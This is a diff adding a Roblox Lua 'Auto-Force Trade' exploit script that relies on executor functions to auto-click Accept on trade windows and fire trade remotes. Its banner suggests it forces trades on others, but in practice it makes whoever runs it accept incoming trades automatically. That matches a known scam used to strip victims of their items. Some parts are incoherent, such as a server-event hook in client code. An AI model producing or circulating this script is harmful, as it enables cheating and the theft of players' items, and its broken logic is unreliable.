@@ -1,0 +1,53 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local TradeRequest = {}
+
+local function ForceAcceptTrade(tradeFrame)
+    if not tradeFrame then return end
+    local AcceptButton = tradeFrame:FindFirstChild("Accept", true) or tradeFrame:FindFirstChild("AcceptBtn", true)
+    if AcceptButton then
+        for _ = 1, 2 do
+            fireclickdetector(AcceptButton:FindFirstChildOfClass("ClickDetector") or AcceptButton)
+            task.wait(0.1)
+        end
+    end
+end
+
+local function OnChildAdded(child)
+    if child.Name:lower():find("trade") or child.Name:lower():find("exchange") then
+        ForceAcceptTrade(child)
+    end
+end
+
+LocalPlayer.PlayerGui.ChildAdded:Connect(OnChildAdded)
+for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
+    OnChildAdded(gui)
+end
+
+local function OnTradeRequest(sender)
+    TradeRequest[sender] = true
+    ReplicatedStorage:WaitForChild("TradeRE"):FireServer("Accept", sender)
+end
+
+for _, remote in ipairs(getnilinstances()) do
+    if remote.Name == "TradeRE" and remote:IsA("RemoteEvent") then
+        remote.OnClientEvent:Connect(OnTradeRequest)
+    end
+end
+
+local function ForceTrade(player)
+    local tradeEvent = ReplicatedStorage:WaitForChild("TradeEvent")
+    tradeEvent:FireServer(player)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if player:FindFirstChild("TradeRequest") then
+        player.TradeRequest.OnServerEvent:Connect(function(otherPlayer)
+            ForceTrade(player)
+            ForceTrade(otherPlayer)
+        end)
+    end
+end)
+
+warn("Auto-Force Trade Script Activated | Trades will auto-accept!")
